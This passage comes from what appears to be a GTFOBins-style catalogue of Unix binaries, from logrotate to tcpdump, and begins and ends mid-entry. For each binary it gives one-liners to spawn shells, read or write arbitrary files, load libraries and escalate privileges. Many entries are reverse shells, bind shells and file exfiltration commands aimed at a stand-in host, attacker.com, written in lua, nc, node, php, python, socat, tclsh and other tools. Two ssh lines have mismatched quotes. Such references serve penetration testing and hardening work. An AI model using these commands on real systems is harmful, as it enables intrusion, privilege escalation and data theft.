logrotate -l /path/to/output-file DATA
```

### logsave

**shell** — spawns an interactive shell

```bash
logsave /dev/null /bin/sh -i -p
```

### look

**file-read** — reads an arbitrary file

```bash
look '' /path/to/input-file
```

### lp

**upload** — upload

This requires `cups` to be installed. Run the following on the attacker box beforehand:

1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
2. `lpadmin -d printer` to set the new printer as default;
3. `cupsctl --remote-any` to enable printing from the Internet.

```bash
lp /path/to/input-file -h attacker.com
```

### ltrace

**file-read** — reads an arbitrary file

The file is parsed as a configuration file and its content is shown as error messages.

```bash
ltrace -F /path/to/input-file /dev/null
```

### lua

**bind-shell** — listens for an inbound connection

This requires `lua-socket` to be available.

```bash
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```

**download** — download

This requires `lua-socket` to be available.

```bash
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("/path/to/output-file", "wb");
  f:write(d);
  io.close(f);'
```

**file-read** — reads an arbitrary file

```bash
lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
```

**file-write** — writes to an arbitrary file

```bash
lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
```

**reverse-shell** — connects back to a listener you control

This requires `lua-socket` to be available.

```bash
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```

**shell** — spawns an interactive shell

```bash
lua -e 'os.execute("/bin/sh")'
```

**upload** — upload

This requires `lua-socket` to be available.

```bash
lua -e '
  local f=io.open("/path/to/input-file", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  t:send(d);
  t:close();'
```

### lualatex

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
lualatex -shell-escape '\directlua{...}\end'
```

### luatex

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
luatex -shell-escape '\directlua{...}\end'
```

### lxd

**shell** — spawns an interactive shell

The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.

```bash
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

**shell** — spawns an interactive shell

This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

```bash
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

### m4

**command** — runs a single command

```bash
echo 'esyscmd(/path/to/command)' | m4
```

**file-read** — reads an arbitrary file

```bash
m4 /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
```

### mail

**shell** — spawns an interactive shell

```bash
mail --exec='!/bin/sh'
```

**shell** — spawns an interactive shell

```bash
mail -f /etc/hosts
!/bin/sh
```

### make

**file-read** — reads an arbitrary file

```bash
make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
```

**file-write** — writes to an arbitrary file

```bash
make -s --eval='$(file >/path/to/output-file,DATA)' .
```

**shell** — spawns an interactive shell

```bash
make --eval='$(shell /bin/sh 1>&0)' .
```

### man

**file-read** — reads an arbitrary file

The file is shown somehow formatted and displayed in the default pager.

```bash
man /path/to/input-file
```

**inherit** — inherit

```bash
man man
```

**shell** — spawns an interactive shell

This requires GNU `troff` (`groff`) to be installed.

```bash
man '-H/bin/sh #' man
```

### mawk

**file-read** — reads an arbitrary file

```bash
mawk '//' /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

**shell** — spawns an interactive shell

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

### minicom

**shell** — spawns an interactive shell

Start the following command to open the TUI interface, then:

1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.

After the shell, exit with `Ctrl-A x`.

```bash
minicom -D /dev/null
```

**shell** — spawns an interactive shell

After the shell, exit with `Ctrl-A x`.

```bash
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J
```

### more

**file-read** — reads an arbitrary file

The file is displayed in the terminal interface.

```bash
more /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
more /etc/hosts
!/bin/sh
```

### mosquitto

**file-read** — reads an arbitrary file

The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.

```bash
mosquitto -c /path/to/input-file
```

### msgattrib

**file-read** — reads an arbitrary file

The file is parsed and displayed as a Java `.properties` file.

```bash
msgattrib -P /path/to/input-file
```

### msgcat

**file-read** — reads an arbitrary file

The file is parsed and displayed as a Java `.properties` file.

```bash
msgcat -P /path/to/input-file
```

### msgconv

**file-read** — reads an arbitrary file

The file is parsed and displayed as a Java `.properties` file.

```bash
msgconv -P /path/to/input-file
```

### msgfilter

**file-read** — reads an arbitrary file

The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.

```bash
msgfilter -P -i /path/to/input-file /bin/cat
```

**shell** — spawns an interactive shell

The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.

```bash
echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
```

### msgmerge

**file-read** — reads an arbitrary file

The file is parsed and displayed as a Java `.properties` file.

```bash
msgmerge -P /path/to/input-file /dev/null
```

### msguniq

**file-read** — reads an arbitrary file

The file is parsed and displayed as a Java `.properties` file.

```bash
msguniq -P /path/to/input-file
```

### multitime

**shell** — spawns an interactive shell

```bash
multitime /bin/sh -p
```

### mv

**file-write** — writes to an arbitrary file

```bash
echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file
```

**privilege-escalation** — privilege-escalation

This can be used to move and then read or write files from a restricted file systems or with elevated privileges.

```bash
mv /path/to/input-file /path/to/output-file
```

### mysql

**library-load** — loads an arbitrary shared library

The following loads the `/path/to/lib.so` shared object.

```bash
mysql --default-auth ../../../../../path/to/lib
```

**shell** — spawns an interactive shell

```bash
mysql -e '\! /bin/sh'
```

### nano

**file-read** — reads an arbitrary file

The file content is displayed in the terminal interface.

```bash
nano /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
nano /path/to/output-file
DATA
^O
```

**shell** — spawns an interactive shell

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

**shell** — spawns an interactive shell

The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.

```bash
nano -s '/bin/sh -p'
/bin/sh -p
^T^T
```

### nasm

**file-read** — reads an arbitrary file

The file content is treated as command line options and disclosed throught error messages.

```bash
nasm -@ /path/to/input-file
```

### nc

**bind-shell** — listens for an inbound connection

This only works with netcat traditional.

```bash
nc -l -p 12345 -e /bin/sh
```

**download** — download

The file is actually written by the invoking shell.

```bash
nc -l -p 12345 >/path/to/output-file
```

**download** — download

The file is actually written by the invoking shell.

```bash
nc attacker.com 12345 >/path/to/output-file
```

**reverse-shell** — connects back to a listener you control

This only works with netcat traditional.

```bash
nc -e /bin/sh attacker.com 12345
```

**upload** — upload

The file is actually read by the invoking shell.

```bash
nc -l -p 12345 </path/to/input-file
```

**upload** — upload

The file is actually read by the invoking shell.

```bash
nc attacker.com 12345 </path/to/input-file
```

### ncdu

**shell** — spawns an interactive shell

```bash
ncdu
b
```

### ncftp

**shell** — spawns an interactive shell

```bash
ncftp
!/bin/sh -p
```

### nginx

**library-load** — loads an arbitrary shared library

Alternatively, the `ssl_engine` directive can be used.

```bash
cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file
```

### nice

**shell** — spawns an interactive shell

```bash
nice /bin/sh -p
```

### nl

**file-read** — reads an arbitrary file

The read file content is corrupted by a leading space added to each line.

```bash
nl -bn -w1 -s '' /path/to/input-file
```

### nm

**file-read** — reads an arbitrary file

The file content is treated as command line options and disclosed through error messages.

```bash
nm /path/to/input-file
```

### nmap

**file-read** — reads an arbitrary file

The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.

```bash
nmap -iL /path/to/input-file
```

**file-write** — writes to an arbitrary file

The payload appears inside the regular nmap output.

```bash
nmap -oG=/path/to/output-file DATA
```

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
echo '...' >/path/to/temp-file
nmap --script=/path/to/temp-file
```

**shell** — spawns an interactive shell

```bash
nmap --interactive
!/bin/sh
```

### node

**bind-shell** — listens for an inbound connection

```bash
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'
```

**download** — download

```bash
node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
```

**file-read** — reads an arbitrary file

```bash
node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
```

**file-write** — writes to an arbitrary file

```bash
node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
```

**reverse-shell** — connects back to a listener you control

```bash
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```

**shell** — spawns an interactive shell

```bash
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```

**upload** — upload

```bash
node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
```

### nohup

**command** — runs a single command

The `nohup.out` file contains the standard output and error of the command.

```bash
nohup /path/to/command
cat nohup.out
```

**shell** — spawns an interactive shell

This creates a `nohup.out` file in the current working directory.

```bash
nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
```

### nsenter

**shell** — spawns an interactive shell

The shell command can be omitted.

```bash
nsenter /bin/sh -p
```

### ntpdate

**file-read** — reads an arbitrary file

The file is actually parsed and lines are leaked through error messages.

```bash
ntpdate -a x -k /path/to/input-file -d localhost
```

### octave

**file-read** — reads an arbitrary file

```bash
octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```

**file-write** — writes to an arbitrary file

```bash
octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
```

**shell** — spawns an interactive shell

```bash
octave-cli --eval 'system("/bin/sh")'
```

### od

**file-read** — reads an arbitrary file

Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.

```bash
od -An -c -w999 /path/to/input-file
```

### opencode

**command** — runs a single command

```bash
opencode
! /path/to/command
```

### openssl

**download** — download

```bash
openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
```

**file-read** — reads an arbitrary file

```bash
openssl enc -in /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | openssl enc -out /path/to/output-file
```

**file-write** — writes to an arbitrary file

```bash
openssl enc -in /path/to/input-file -out /path/to/output-file
```

**library-load** — loads an arbitrary shared library

```bash
openssl req -engine ./lib.so
```

**reverse-shell** — connects back to a listener you control

The shell process is not spawn by `openssl`.

```bash
mkfifo /path/to/temp-socket
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
```

**upload** — upload

```bash
openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
```

### openvpn

**file-read** — reads an arbitrary file

The file is actually parsed and the first partial wrong line is returned in an error message.

```bash
openvpn --config /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
```

### pandoc

**file-read** — reads an arbitrary file

```bash
pandoc -t plain /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | pandoc -t plain -o /path/to/output-file
```

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
echo '...' >/path/to/temp-file
pandoc -L /path/to/temp-file /dev/null
```

### paste

**file-read** — reads an arbitrary file

```bash
paste /path/to/input-file
```

### pax

**file-read** — reads an arbitrary file

```bash
pax -w /path/to/input-file | tar -xO
```

### pdflatex

**file-read** — reads an arbitrary file

The read file will be part of the PDF output.

```bash
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -
```

**file-write** — writes to an arbitrary file

The file can only be written in the current directory, and the `.tex` extension is mandatory.

```bash
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

**shell** — spawns an interactive shell

```bash
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

### pdftex

**shell** — spawns an interactive shell

```bash
pdftex --shell-escape '\write18{/bin/sh}\end'
```

### perf

**shell** — spawns an interactive shell

```bash
perf stat /bin/sh -p
```

### perl

**file-read** — reads an arbitrary file

```bash
perl -ne print /path/to/input-file
```

### pexec

**shell** — spawns an interactive shell

```bash
pexec /bin/sh -p
```

### pg

**file-read** — reads an arbitrary file

```bash
pg /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
pg /etc/hosts
!/bin/sh
```

### php

**command** — runs a single command

```bash
php -r 'echo shell_exec("/path/to/command");'
```

**command** — runs a single command

```bash
php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
```

**command** — runs a single command

```bash
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```

**download** — download

```bash
php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
```

**file-read** — reads an arbitrary file

```bash
php -r 'readfile("/path/to/input-file");'
```

**file-write** — writes to an arbitrary file

```bash
php -r 'file_put_contents("/path/to/output-file", "DATA");'
```

**reverse-shell** — connects back to a listener you control

```bash
php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```

**shell** — spawns an interactive shell

```bash
php -r 'system("/bin/sh -i");'
```

**shell** — spawns an interactive shell

```bash
php -r 'passthru("/bin/sh -i");'
```

**shell** — spawns an interactive shell

```bash
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

**shell** — spawns an interactive shell

```bash
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

**upload** — upload

```bash
php -S 0.0.0.0:80
```

### pic

**file-read** — reads an arbitrary file

The output is prefixed with some content.

```bash
pic /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
pic -U
.PS
sh X sh X
```

### pidstat

**shell** — spawns an interactive shell

```bash
pidstat -e /bin/sh -p
```

### plymouth

**shell** — spawns an interactive shell

```bash
plymouth ask-for-password --prompt=x --command='/bin/sh -p'
```

### pr

**file-read** — reads an arbitrary file

```bash
pr -T /path/to/input-file
```

### psftp

**shell** — spawns an interactive shell

```bash
psftp
!/bin/sh
```

### psql

**inherit** — inherit

```bash
psql
\?
```

**shell** — spawns an interactive shell

```bash
psql
\! /bin/sh
```

### ptx

**file-read** — reads an arbitrary file

```bash
ptx -w 999 /path/to/input-file
```

### python

**download** — download

```bash
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```

**file-read** — reads an arbitrary file

```bash
python -c 'print(open("/path/to/input-file").read())'
```

**file-write** — writes to an arbitrary file

```bash
python -c 'open("/path/to/output-file","w+").write("DATA")'
```

**library-load** — loads an arbitrary shared library

```bash
python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
```

**reverse-shell** — connects back to a listener you control

```bash
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("attacker.com",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```

**shell** — spawns an interactive shell

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**upload** — upload

```bash
python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
```

**upload** — upload

```bash
python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
```

### qpdf

**file-read** — reads an arbitrary file

```bash
qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file
```

### rc

**shell** — spawns an interactive shell

```bash
rc
```

### readelf

**file-read** — reads an arbitrary file

Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.

```bash
readelf -a @/path/to/input-file
```

### redis

**file-write** — writes to an arbitrary file

Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.

Keep in mind that it's actually the server to perform the file write.

```bash
redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save
```

### restic

**command** — runs a single command

```bash
RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
```

**command** — runs a single command

```bash
restic --password-command='/path/to/command' backup
```

**shell** — spawns an interactive shell

```bash
RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
```

**shell** — spawns an interactive shell

```bash
restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
```

**upload** — upload

```bash
restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
```

### rev

**file-read** — reads an arbitrary file

```bash
rev /path/to/input-file | rev
```

### rlogin

**upload** — upload

The file is corrupted by leading and trailing spurious data.

```bash
rlogin -l DATA -p 12345 attacker.com
```

### rlwrap

**file-write** — writes to an arbitrary file

This adds timestamps to the output file. This relies on the external `echo` command.

```bash
rlwrap -l /path/to/output-file echo DATA
```

**shell** — spawns an interactive shell

```bash
rlwrap /bin/sh -p
```

### rpm

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
rpm --eval '%{lua:...}'
```

**shell** — spawns an interactive shell

```bash
rpm --eval '%(/bin/sh 1>&2)'
```

**shell** — spawns an interactive shell

```bash
rpm --pipe '/bin/sh 0<&1'
```

### rpmdb

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
rpmdb --eval '%{lua:...}'
```

**shell** — spawns an interactive shell

```bash
rpmdb --eval '%(/bin/sh 1>&2)'
```

### rpmquery

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
rpmquery --eval '%{lua:...}'
```

**shell** — spawns an interactive shell

```bash
rpmquery --eval '%(/bin/sh 1>&2)'
```

### rpmverify

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
rpmverify --eval '%{lua:...}'
```

**shell** — spawns an interactive shell

```bash
rpmverify --eval '%(/bin/sh 1>&2)'
```

### rsync

**shell** — spawns an interactive shell

```bash
rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
```

### rtorrent

**shell** — spawns an interactive shell

After the shell, exit with `Ctrl-Q`.

```bash
echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```

### run-parts

**shell** — spawns an interactive shell

```bash
run-parts --new-session --regex '^sh$' /bin --arg='-p'
```

**shell** — spawns an interactive shell

```bash
cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/ --arg='-p'
```

### runscript

**shell** — spawns an interactive shell

```bash
echo '! exec /bin/sh' >/path/to/temp-file
runscript /path/to/temp-file
```

### sash

**shell** — spawns an interactive shell

```bash
sash
```

### scanmem

**shell** — spawns an interactive shell

```bash
scanmem
shell /bin/sh
```

### scp

**download** — download

```bash
scp user@attacker.com:/path/to/input-file /path/to/output-file
```

**shell** — spawns an interactive shell

```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:
```

**shell** — spawns an interactive shell

```bash
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```

**upload** — upload

```bash
scp /path/to/input-file user@attacker.com:/path/to/output-file
```

### script

**file-write** — writes to an arbitrary file

The content appears among the log prints.

```bash
script -q -c '# DATA' /path/to/output-file
```

**shell** — spawns an interactive shell

```bash
script -q /dev/null
```

### scrot

**shell** — spawns an interactive shell

```bash
scrot -e /bin/sh
```

### sed

**file-read** — reads an arbitrary file

```bash
sed '' /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
```

**shell** — spawns an interactive shell

```bash
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

**shell** — spawns an interactive shell

```bash
sed e
```

### setarch

**shell** — spawns an interactive shell

```bash
setarch -3 /bin/sh -p
```

### setcap

**privilege-escalation** — privilege-escalation

This can be used to assign capabilities to executable files.

```bash
setcap cap_setuid+ep /path/to/command
```

### setfacl

**privilege-escalation** — privilege-escalation

This can be run with elevated privileges to change ownership and then read, write, or execute a file.

```bash
setfacl -m u:$(id -un):rwx /path/to/input-file
```

### setlock

**shell** — spawns an interactive shell

```bash
setlock - /bin/sh -p
```

### sftp

**download** — download

```bash
sftp user@attacker.com
get /path/to/input-file /path/to/output-file
```

**shell** — spawns an interactive shell

This still requires a successfull connection to the server.

```bash
sftp user@attacker.com
!/bin/sh
```

**upload** — upload

```bash
sftp user@attacker.com
put /path/to/input-file /path/to/output-file
```

### shred

**file-write** — writes to an arbitrary file

This actually deletes the chosen file.

```bash
shred -u /path/to/output-file
```

### shuf

**file-read** — reads an arbitrary file

The read file content is corrupted by randomizing the order of NUL terminated strings.

```bash
shuf -z /path/to/input-file
```

**file-write** — writes to an arbitrary file

The written file content is corrupted by adding a newline.

```bash
shuf -e DATA -o /path/to/output-file
```

### slsh

**shell** — spawns an interactive shell

```bash
slsh -e 'system("/bin/sh")'
```

### socat

**bind-shell** — listens for an inbound connection

```bash
socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```

**download** — download

```bash
socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
```

**file-read** — reads an arbitrary file

```bash
socat -u file:/path/to/input-file -
```

**file-write** — writes to an arbitrary file

The `echo` command is actually used.

```bash
socat -u 'exec:echo DATA' open:/path/to/output-file,creat
```

**reverse-shell** — connects back to a listener you control

```bash
socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```

**shell** — spawns an interactive shell

```bash
socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
```

**upload** — upload

```bash
socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
```

### socket

**bind-shell** — listens for an inbound connection

```bash
socket -svp '/bin/sh -i' 12345
```

**reverse-shell** — connects back to a listener you control

```bash
socket -qvp '/bin/sh -i' attacker.com 12345
```

### soelim

**file-read** — reads an arbitrary file

The content is actually parsed and corrupted by the command.

```bash
soelim /path/to/input-file
```

### softlimit

**shell** — spawns an interactive shell

```bash
softlimit /bin/sh -p
```

### sort

**file-read** — reads an arbitrary file

```bash
sort -m /path/to/input-file
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | sort -m -o /path/to/output-file
```

### split

**file-read** — reads an arbitrary file

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
cat prefixaasuffix
```

**file-write** — writes to an arbitrary file

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
```

**shell** — spawns an interactive shell

```bash
split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
```

### sqlite3

**file-read** — reads an arbitrary file

```bash
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF
```

**file-write** — writes to an arbitrary file

```bash
sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
```

**shell** — spawns an interactive shell

```bash
sqlite3 /dev/null '.shell /bin/sh'
```

### ss

**file-read** — reads an arbitrary file

The file content is actually parsed so only a part of the first line is returned as a part of an error message.

```bash
ss -a -F /path/to/input-file
```

### ssh

**download** — download

```bash
ssh user@attacker.com 'cat /path/to/input-file"
```

**file-read** — reads an arbitrary file

The read file content is corrupted by error prints.

```bash
ssh -F /path/to/input-file x
```

**shell** — spawns an interactive shell

Reconnecting may help bypassing restricted shells.

```bash
ssh localhost /bin/sh
```

**upload** — upload

```bash
echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
```

### ssh-agent

**shell** — spawns an interactive shell

```bash
ssh-agent /bin/sh -p
```

### ssh-keygen

**library-load** — loads an arbitrary shared library

The shared library must contain the `void C_GetFunctionList() {}` function.

```bash
ssh-keygen -D /path/to/lib.so
```

### ssh-keyscan

**file-read** — reads an arbitrary file

The file content is actually parsed so only a part of each line is returned as a part of an error message.

```bash
ssh-keyscan -f /path/to/input-file
```

### sshpass

**shell** — spawns an interactive shell

```bash
sshpass /bin/sh -p
```

### start-stop-daemon

**shell** — spawns an interactive shell

```bash
start-stop-daemon -S -x /bin/sh -- -p
```

### stdbuf

**shell** — spawns an interactive shell

```bash
stdbuf -i0 /bin/sh -p
```

### strace

**shell** — spawns an interactive shell

```bash
strace -o /dev/null /bin/sh -p
```

### strings

**file-read** — reads an arbitrary file

This only returns ASCII strings.

```bash
strings /path/to/input-file
```

### sysctl

**command** — runs a single command

The command is executed by `root` in the background when a core dump occurs.

To trigger a core dump, send the `SIGQUIT` signal to a process, for example:

```
sleep infinity &
kill -QUIT $!
```

```bash
sysctl 'kernel.core_pattern=|/path/to/command'
```

**file-read** — reads an arbitrary file

```bash
sysctl -n "/../../path/to/input-file"
```

### systemctl

**inherit** — inherit

```bash
systemctl
```

**shell** — spawns an interactive shell

It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.

```bash
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service
```

### tac

**file-read** — reads an arbitrary file

Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.

```bash
tac -s 'RANDOM' /path/to/input-file
```

### tail

**file-read** — reads an arbitrary file

```bash
tail -c+0 /path/to/input-file
```

### tar

**download** — download

The attacker box must have the `rmt` utility installed.

```bash
tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
```

**file-read** — reads an arbitrary file

The file is read then passed to the specified command (e.g., `tar xO`) via standard input.

```bash
tar cf /dev/stdout /path/to/input-file -I 'tar xO'
```

**file-write** — writes to an arbitrary file

The archive can also be prepared offline then uploaded to the target.

```bash
echo DATA >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
```

**shell** — spawns an interactive shell

```bash
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**shell** — spawns an interactive shell

```bash
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

**shell** — spawns an interactive shell

The archive can also be prepared offline then uploaded to the target.

```bash
echo '/bin/sh 0<&1' >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar xf /path/to/temp-file.tar --to-command /bin/sh
```

**upload** — upload

The attacker box must have the `rmt` utility installed.

```bash
tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
```

### task

**shell** — spawns an interactive shell

```bash
task execute /bin/sh
```

### tasksh

**shell** — spawns an interactive shell

```bash
tasksh
!/bin/sh
```

### tbl

**file-read** — reads an arbitrary file

The read file content is corrupted by additional text at the beginning.

```bash
tbl /path/to/input-file
```

### tclsh

**library-load** — loads an arbitrary shared library

```bash
tclsh
load /path/to/lib.so x
```

**reverse-shell** — connects back to a listener you control

```bash
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```

**shell** — spawns an interactive shell

```bash
tclsh
```

### tcpdump

**file-write** — writes to an arbitrary file

